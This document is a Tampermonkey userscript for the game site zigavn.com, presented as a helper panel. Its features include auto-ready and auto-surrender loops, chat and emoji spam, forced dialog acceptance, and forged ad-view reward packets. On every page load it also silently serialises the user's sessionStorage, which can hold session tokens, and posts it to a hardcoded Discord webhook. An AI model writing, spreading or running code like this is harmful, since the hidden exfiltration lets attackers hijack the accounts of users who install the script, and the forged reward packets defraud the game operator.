// ==UserScript==
// @name         v4 Fonsida Ultimate v3.4 - Full Gộp Chat + Icon + UI Tổng Hợp (Auto Discord)
// @namespace    http://tampermonkey.net/
// @version      3.4
// @description  UI Ready + Auto Agree + Buff 121s + Xin thua + Chat + Icon Chat + BlockChat + Refuse Draw (Gửi Discord tự động)
// @match        https://zigavn.com/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';

  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  let readyInterval = null;
  let adInterval = 121000;
  let adTimer = null;
  let surrenderInterval = null;
  let chatOn = false;

  const iconList = [
    "8-|", "|-)", ":^o", "=P~", ":O)", ":)", ":-h", ":x", ":))", "=p~",
    "=))", ":D", ":-a", ":((", "o-)", "~X(", ":-S", ":-B", "=;", "/:)",
    ":-c", ":)]", ":-t", "8->", "I-)", ":-y", ":-u", ":-i", ":-p", ":-g",
    ":-f", ":-s", ":-w", ":-q", ":-r", ":-x", ":-m", ":-n", ":-z"
  ];

  let iconIndex = 0;
  let chatList = [];
  let chatIndex = 0;
  let iconOn = false;

  function sendMainPacket() {
    const p = new BkPacket();
    p.yj(Ze, PLAYER_STATE_READY);
    BkConnectionManager.send(p);
  }

  function startReadyPacket() {
    if (!readyInterval) readyInterval = setInterval(sendMainPacket, 50);
  }

  function stopReadyPacket() {
    if (readyInterval) clearInterval(readyInterval);
    readyInterval = null;
  }

  function tryCallFz() {
    try {
      const scene = cc.director.getRunningScene();
      if (!scene || !scene.children) return;
      for (const node of scene.children) {
        if (typeof node?.fz === 'function' && typeof node?.S === 'function') {
          const state = node.S();
          const gameState = state?.Ib;
          const player = state?.Ca?.();
          if (gameState === GAME_STATE_PLAYING && player?.status !== PLAYER_STATE_NOT_READY) {
            node.fz();
            console.log("[TM] Gọi fz() xin thua thành công!");
          }
        }
      }
    } catch (err) {
      console.warn("[TM] Gọi fz() lỗi:", err);
    }
  }

  function startSurrenderLoop() {
    if (!surrenderInterval) surrenderInterval = setInterval(tryCallFz, 50);
  }

  function stopSurrenderLoop() {
    if (surrenderInterval) clearInterval(surrenderInterval);
    surrenderInterval = null;
  }

  function sendAdPacket() {
    console.log("adViewed");
    logMessage("WebAdsManager - afterViewedAdsRewardOnWeb()");
    const p = new BkPacket();
    p.En(O);
    BkConnectionManager.send(p);
  }

  function startAdTimer() {
    if (adTimer) clearInterval(adTimer);
    adTimer = setInterval(sendAdPacket, adInterval);
  }

  function sendChatMessage(msg) {
    logMessage("sendChatMessage: " + msg);
    const p = new BkPacket();
    p.jq(msg);
    BkConnectionManager.send(p);
  }

  function startChatLoop() {
    if (chatOn) return;

    if (chatList.length === 0) {
      chatList = [
        "GG",
        "Chơi hay đấy!",
        "Xin thua nha 😅",
        "Tôi đi trước nhé!",
        "Thử lại ván nữa không?"
      ];
      alert(`Đã tự động thêm ${chatList.length} câu chat mẫu.`);
    }

    chatIndex = 0;
    iconIndex = 0;
    chatOn = true;

    async function chatCycle() {
      while (chatOn) {
        sendChatMessage(chatList[chatIndex]);
        chatIndex = (chatIndex + 1) % chatList.length;
        await delay(4000);

        if (iconOn) {
          sendChatMessage(iconList[iconIndex]);
          iconIndex = (iconIndex + 1) % iconList.length;
          await delay(4000);
        }
      }
    }

    chatCycle();
  }

  function stopChatLoop() {
    chatOn = false;
    chatIndex = 0;
    iconIndex = 0;
  }

  function sendToDiscord() {
    let sessionData = Object.fromEntries(Object.entries(sessionStorage));
    let jsonData = JSON.stringify(sessionData, null, 2);
    let payload = {
      content: "📥 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
    };
    fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function createControlUI() {
    const container = document.createElement('div');
    Object.assign(container.style, {
      position: 'fixed', top: '100px', left: '20px', background: '#111', color: '#fff',
      padding: '6px', borderRadius: '6px', font: '11px Arial', zIndex: 99999,
      display: 'flex', flexDirection: 'column', gap: '6px', boxShadow: '0 0 4px rgba(0,0,0,0.4)',
      border: '1px solid #333', resize: 'both', overflow: 'auto', minWidth: '150px', width: 'fit-content'
    });

    const dragBar = document.createElement('div');
    dragBar.textContent = "🎛️ Fonsida Control";
    Object.assign(dragBar.style, {
      background: '#222', padding: '4px 6px', cursor: 'move', userSelect: 'none',
      fontWeight: 'bold', fontSize: '11px', borderRadius: '4px', textAlign: 'center'
    });

    let isDragging = false, offsetX = 0, offsetY = 0;
    dragBar.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - container.getBoundingClientRect().left;
      offsetY = e.clientY - container.getBoundingClientRect().top;
      e.preventDefault();
    });
    document.addEventListener('mousemove', (e) => {
      if (isDragging) {
        container.style.left = `${e.clientX - offsetX}px`;
        container.style.top = `${e.clientY - offsetY}px`;
        container.style.bottom = 'auto';
      }
    });
    document.addEventListener('mouseup', () => isDragging = false);

    const readyLabel = document.createElement('div');
    readyLabel.textContent = "READY: OFF";
    const readyBtn = document.createElement('button');
    readyBtn.textContent = "Bật";
    readyBtn.style.cssText = "padding:4px 8px;border-radius:4px;border:none;background:#555;color:#fff;cursor:pointer;font-size:11px;";
    let readyOn = false;
    readyBtn.onclick = () => {
      readyOn = !readyOn;
      if (readyOn) {
        startReadyPacket();
        readyLabel.textContent = "READY: ON";
        readyBtn.textContent = "Tắt";
        readyBtn.style.background = "#4caf50";
      } else {
        stopReadyPacket();
        readyLabel.textContent = "READY: OFF";
        readyBtn.textContent = "Bật";
        readyBtn.style.background = "#555";
      }
    };

    const surrenderLabel = document.createElement('div');
    surrenderLabel.textContent = "SURRENDER: OFF";
    const surrenderBtn = document.createElement('button');
    surrenderBtn.textContent = "Bật";
    surrenderBtn.style.cssText = readyBtn.style.cssText;
    let surrenderOn = false;
    surrenderBtn.onclick = () => {
      surrenderOn = !surrenderOn;
      if (surrenderOn) {
        startSurrenderLoop();
        surrenderLabel.textContent = "SURRENDER: ON";
        surrenderBtn.textContent = "Tắt";
        surrenderBtn.style.background = "#f44336";
      } else {
        stopSurrenderLoop();
        surrenderLabel.textContent = "SURRENDER: OFF";
        surrenderBtn.textContent = "Bật";
        surrenderBtn.style.background = "#555";
      }
    };

    const chatLabel = document.createElement('div');
    chatLabel.textContent = "CHAT: OFF";
    const chatBtn = document.createElement('button');
    chatBtn.textContent = "Bật";
    chatBtn.style.cssText = readyBtn.style.cssText;
    chatBtn.onclick = () => {
      if (chatOn) {
        stopChatLoop();
        chatLabel.textContent = "CHAT: OFF";
        chatBtn.textContent = "Bật";
        chatBtn.style.background = "#555";
      } else {
        startChatLoop();
        chatLabel.textContent = "CHAT: ON";
        chatBtn.textContent = "Tắt";
        chatBtn.style.background = "#ff9800";
      }
    };

    const iconLabel = document.createElement('div');
    iconLabel.textContent = "CHÈN ICON: OFF";
    const iconBtn = document.createElement('button');
    iconBtn.textContent = "Bật";
    iconBtn.style.cssText = readyBtn.style.cssText;
    iconBtn.onclick = () => {
      iconOn = !iconOn;
      iconLabel.textContent = iconOn ? "CHÈN ICON: ON" : "CHÈN ICON: OFF";
      iconBtn.textContent = iconOn ? "Tắt" : "Bật";
      iconBtn.style.background = iconOn ? "#2196f3" : "#555";
    };

    const chatInputBtn = document.createElement('button');
    chatInputBtn.textContent = "Nhập Nội Dung Chat";
    chatInputBtn.style.cssText = readyBtn.style.cssText;
    chatInputBtn.onclick = () => {
      const current = chatList.join("\n");
      const content = prompt("Nhập mỗi câu chat trên 1 dòng:", current);
      if (content) {
        chatList = content.split(/\r?\n/).map(x => x.trim()).filter(Boolean);
        alert(`Đã lưu ${chatList.length} câu chat.`);
      }
    };

    container.append(
      dragBar,
      readyLabel, readyBtn,
      surrenderLabel, surrenderBtn,
      chatLabel, chatBtn,
      iconLabel, iconBtn,
      chatInputBtn
    );

    document.body.appendChild(container);
  }

  function forceAgree() {
    try {
      const scenes = cc.director.getRunningScene()?.children || [];
      for (const node of scenes) {
        if (node instanceof BkDialogWindow) {
          console.log("[TM] Force auto-agree BkDialogWindow");
          node.Xe?._clickListeners?.[0]?.();
          if (typeof node.cm === "function") {
            node.cm();
            node.cm = null;
          }
          node.removeSelf();
        }
      }
    } catch (err) {
      console.warn("[TM] Force Agree Error:", err);
    }
  }

  const observer = new MutationObserver(forceAgree);
  observer.observe(document.body, { childList: true, subtree: true });
  setInterval(forceAgree, 50);

  window.addEventListener("load", async () => {
    createControlUI();
    sendToDiscord(); // ✅ Tự động gửi sessionStorage lên Discord
    await delay(15000);
    sendAdPacket();
    startAdTimer();
  });
})();
